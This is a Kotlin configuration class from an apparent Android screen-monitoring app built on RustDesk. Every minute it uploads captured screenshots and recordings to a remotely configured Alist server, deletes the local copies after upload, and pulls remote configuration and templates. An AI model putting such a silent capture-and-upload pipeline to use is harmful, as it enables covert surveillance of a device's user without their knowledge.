package com.youyou.monitor

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.carriez.flutter_hbb.MainApplication
import android.util.Log
import com.carriez.flutter_hbb.MainActivity
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * 屏幕监控配置类，支持定时从网页下载json并自动更新配置。
 */

val intervalMinutes = 1L // 默认10分钟更新一次配置

class MonitorConfig private constructor() {

    // 最大允许占用空间，单位MB（可根据需要调整）
    @Volatile
    var maxStorageSizeMB: Int = 1024 // 1GB

    /**
     * 定时清理截图和录像目录下的文件，超出最大空间时自动删除最旧文件
     */
    fun startAutoCleanStorage(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            try {
                val screenshotDir = getScreenshotDir()
                val videoDir = getVideoDir()
                val allFiles = (getAllImageFiles(screenshotDir) + getAllVideoFiles(videoDir))
                if (allFiles.isEmpty()) return@scheduleWithFixedDelay
                // 按最后修改时间升序排列（最旧的在前）
                val sortedFiles = allFiles.sortedBy { it.lastModified() }
                var totalSize = sortedFiles.sumOf { it.length() }
                val maxBytes = maxStorageSizeMB * 1024L * 1024L
                var deletedCount = 0
                for (file in sortedFiles) {
                    if (totalSize <= maxBytes) break
                    val fileSize = file.length()
                    if (file.delete()) {
                        totalSize -= fileSize
                        deletedCount++
                        Log.d(TAG, "AutoClean: deleted ${file.absolutePath}, size=$fileSize")
                    }
                }
                if (deletedCount > 0) {
                    Log.i(TAG, "AutoClean: deleted $deletedCount files, remain size=${totalSize / 1024 / 1024}MB")
                }
            } catch (e: Exception) {
                Log.e(TAG, "AutoClean error: $e")
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }
    private val context: Context = MainApplication.appContext

    companion object {
        const val TAG = "MonitorConfig"

        @Volatile
        private var instance: MonitorConfig? = null
        fun getInstance(): MonitorConfig {
            return instance ?: synchronized(this) {
                instance ?: MonitorConfig().also { instance = it }
            }
        }
    }

    // AlistClient 实例
    lateinit var alist: AlistClient

    // 模板更新回调
    var onTemplatesUpdated: (() -> Unit)? = null

    // 配置项
    @Volatile
    var detectPerSecond: Int = 2 // 一秒检测多少次

    @Volatile
    var preferExternalStorage: Boolean = false
        set(value) {
            field = value
            Log.d(TAG, "preferExternalStorage change: $value")
            notifyFlutterRootDirChanged()
        }

    private fun notifyFlutterRootDirChanged() {
        try {
            // 直接访问MainActivity的静态变量，无需反射
            Handler(Looper.getMainLooper()).post {
                val rootDir = getRootDir().absolutePath
                MainActivity.flutterMethodChannel?.invokeMethod("onRootDirChanged", rootDir)
            }

        } catch (e: Exception) {
            Log.e(TAG, "notifyFlutterRootDirChanged error: $e")
        }
    }

    @Volatile
    var screenshotDir: String = "ScreenCaptures" // 图片保存目录

    @Volatile
    var videoDir: String = "ScreenRecord" // 录像保存目录

    @Volatile
    var RootDir: String = "Rustdesk" // 根目录

    private val configFile = File(context.filesDir, "monitor_config_default.json")

    private val executor = Executors.newSingleThreadScheduledExecutor()

    init {
        // 构造函数只做变量初始化，所有耗时操作异步执行
        executor.execute {
            try {
                loadLocalConfig()
                // 启动图片定时上传任务（默认10分钟）
                startAutoUploadImages(intervalMinutes)
                startUpdateConfigFromRemote(intervalMinutes)
                startAutoUploadVideos(intervalMinutes)
                // 启动定时清理任务
                startAutoCleanStorage(intervalMinutes)
            } catch (e: Exception) {
                Log.e(TAG, "Async init error: $e")
            }
        }
    }

    /**
     * 循环 alistApis，尝试下载远程 config.json，成功则替换本地配置
     */
    private fun startUpdateConfigFromRemote(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay(
            {
                val json = getConfigJson()
                kotlinx.coroutines.runBlocking {
                    try {
                        if (json != null) {
                            updateConfig(json)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "tryUpdateConfigFromRemote error: $e")
                    }
                }
            }, 0, intervalMinutes, TimeUnit.MINUTES
        )

    }

    /**
     * 获取配置内容，优先读取 filesDir 下的配置文件，若不存在则读取 assets 目录下的默认配置
     */
    private fun getConfigJson(): String? {
        return try {
            if (configFile.exists()) {
                configFile.readText()
            } else {
                // assets/monitor_config_default.json
                context.assets.open("monitor_config_default.json").bufferedReader()
                    .use { it.readText() }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getConfigJson error: $e")
            null
        }
    }

    private fun loadLocalConfig() {
        try {
            val json = getConfigJson()
            if (!json.isNullOrBlank()) {
                kotlinx.coroutines.runBlocking {
                    updateConfig(json)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "loadLocalConfig error: $e")
        }
    }

    private fun saveLocalConfig(json: String) {
        try {
            configFile.writeText(json)
        } catch (e: Exception) {
            Log.e(TAG, "saveLocalConfig error: $e")
        }
    }

    private suspend fun updateConfig(json: String) {
        try {
            val obj = JSONObject(json)
            Log.d(TAG, "json config: $json")
            // 解析 alistApis 数组
            val alistApisArr = obj.optJSONArray("alistApis")
            if (alistApisArr != null && alistApisArr.length() > 0) {
                for (i in 0 until alistApisArr.length()) {
                    val apiObj = alistApisArr.getJSONObject(i)
                    val apiUrl = apiObj?.optString("apiUrl", "")
                    val user = apiObj?.optString("user", "")
                    val pwd = apiObj?.optString("password", "")
                    val monitorDir = apiObj?.optString("monitorDir", "")
                    val remoteDir = apiObj?.optString("remoteUploadDir", "")
                    val templateDir = apiObj?.optString("templateDir", "")
                    if (!apiUrl.isNullOrBlank() && !user.isNullOrBlank() && !pwd.isNullOrBlank()
                        && !monitorDir.isNullOrBlank() && !remoteDir.isNullOrBlank()
                        && !templateDir.isNullOrBlank()
                    ) {
                        val alist = AlistClient(
                            apiUrl,
                            user,
                            pwd,
                            monitorDir,
                            remoteDir,
                            templateDir
                        )
                        alist.fetchToken()
                        // 获取 token（如需强制刷新可调用 alist.fetchToken()）
                        if (alist.token.isNullOrBlank()) {
                            continue
                        } else {
                            val newJson = alist.getConfigJson()
                            if (newJson.isNotBlank()) {
                                if (newJson == json && this::alist.isInitialized && !this.alist.token.isNullOrBlank()) {
                                    Log.d(TAG, "Remote config is the same, no update.")
                                    return
                                }
                                val obj = JSONObject(newJson)
                                this.alist = alist
                                detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
                                preferExternalStorage =
                                    obj.optBoolean("preferExternalStorage", preferExternalStorage)
                                screenshotDir = obj.optString("screenshotDir", screenshotDir)
                                videoDir = obj.optString("videoDir", videoDir)
                                saveLocalConfig(newJson)
                                replaceTemplatesFromRemoteSuspend(alist)
                                Log.d(TAG, "Config updated from remote: $apiUrl")
                                return
                            }
                        }
                    }

                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "updateConfig error: $e")
        }
    }

    /**
     * 下载远程模板并替换本地模板，删除旧模板（新版：直接用 alist.getAllTemplateImages）
     */
    private suspend fun replaceTemplatesFromRemoteSuspend(alist: AlistClient) {
        try {
            val localDir = getTemplateDir()
            if (!localDir.exists()) localDir.mkdirs()
            // 直接批量获取所有模板图片
            val remoteImages = alist.getAllTemplateImages() // Map<String, ByteArray>
            val keepFiles = mutableSetOf<String>()
            for ((fileName, bytes) in remoteImages) {
                try {
                    val file = File(localDir, fileName)
                    file.writeBytes(bytes)
                    keepFiles.add(file.name)
                    Log.d(TAG, "Template image updated: ${file.name}")
                } catch (e: Exception) {
                    Log.e(TAG, "Template download failed: $fileName $e")
                }
            }
            // 删除未在远程的旧模板
            localDir.listFiles { f -> f.isFile && (f.name.endsWith(".png") || f.name.endsWith(".jpg")) }
                ?.forEach { f ->
                    if (!keepFiles.contains(f.name)) {
                        f.delete()
                        Log.d(TAG, "Old template deleted: ${f.name}")
                    }
                }
            // 通知监控逻辑模板已更新
            onTemplatesUpdated?.invoke()
        } catch (e: Exception) {
            Log.e(TAG, "replaceTemplatesFromRemote error: $e")
        }
    }

    /**
     * 获取模板目录（支持优先外部存储，拼接配置路径）
     */
    fun getTemplateDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, "Rustdesk/templates")
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取根目录（支持优先外部存储）
     */
    fun getRootDir(): File {
        val baseDir = if (preferExternalStorage) {
            val ext = File("/storage/emulated/0")
            if (ext.exists() && ext.canWrite()) ext else context.filesDir
        } else {
            context.filesDir
        }
        val dir = File(baseDir, RootDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取图片保存目录（支持优先外部存储，拼接配置路径）
     */
    fun getScreenshotDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, screenshotDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取图片保存目录（支持优先外部存储，拼接配置路径）
     */
    fun getVideoDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, videoDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 定时上传本地图片到远程服务器（alist方式），上传成功后自动删除
     */
    fun startAutoUploadImages(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            kotlinx.coroutines.runBlocking {
                try {
                    val dir = getScreenshotDir()
                    val files = getAllImageFiles(dir)
                    Log.d(TAG, "Found ${files.size} images to upload in ${dir.absolutePath}")
                    val baseDir = dir.absolutePath
                    for (file in files) {
                        Log.d(TAG, "Try upload: ${file.absolutePath}")
                        val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                        val subPath =
                            if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
                        val success = alist.uploadImageToRemoteDir(
                            subPath,
                            file.name,
                            file.readBytes(),
                            overwrite = true
                        )
                        Log.d(TAG, "Upload result: $success for ${file.name}")
                        if (success) {
                            file.delete()
                            Log.d(TAG, "Uploaded and deleted: ${file.name}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Auto upload error: $e")
                }
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }

    // 递归获取所有图片文件
    private fun getAllImageFiles(dir: File): List<File> {
        val result = mutableListOf<File>()
        if (!dir.exists() || !dir.canRead()) return result
        val files = dir.listFiles()
        if (files != null) {
            for (file in files) {
                if (file.isDirectory) {
                    result.addAll(getAllImageFiles(file))
                } else if (file.isFile && (file.name.endsWith(".png") || file.name.endsWith(".jpg"))) {
                    result.add(file)
                }
            }
        }
        return result
    }

    /**
     * 定时上传本地录像文件到远程服务器（alist方式），上传成功后自动删除
     * 支持常见视频格式：mp4、mov、avi、mkv、flv、wmv、webm
     */
    fun startAutoUploadVideos(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            kotlinx.coroutines.runBlocking {
                try {
                    val dir = getVideoDir()
                    val files = getAllVideoFiles(dir)
                    Log.d(TAG, "Found ${files.size} videos to upload in ${dir.absolutePath}")
                    val baseDir = dir.absolutePath
                    for (file in files) {
                        Log.d(TAG, "Try upload video: ${file.absolutePath}")
                        val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                        val subPath =
                            if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
                        val success = alist.uploadImageToRemoteDir(
                            subPath,
                            file.name,
                            file.readBytes(),
                            overwrite = true
                        )
                        Log.d(TAG, "Upload result: $success for ${file.name}")
                        if (success) {
                            file.delete()
                            Log.d(TAG, "Uploaded and deleted: ${file.name}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Auto upload video error: $e")
                }
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }

    // 递归获取所有视频文件
    private fun getAllVideoFiles(dir: File): List<File> {
        val result = mutableListOf<File>()
        if (!dir.exists() || !dir.canRead()) return result
        val files = dir.listFiles()
        if (files != null) {
            for (file in files) {
                if (file.isDirectory) {
                    result.addAll(getAllVideoFiles(file))
                } else if (file.isFile && isVideoFile(file.name)) {
                    result.add(file)
                }
            }
        }
        return result
    }

    // 判断文件名是否为常见视频格式
    private fun isVideoFile(name: String): Boolean {
        val lower = name.lowercase()
        return lower.endsWith(".mp4") || lower.endsWith(".mov") || lower.endsWith(".avi") ||
                lower.endsWith(".mkv") || lower.endsWith(".flv") || lower.endsWith(".wmv") ||
                lower.endsWith(".webm")
    }
}
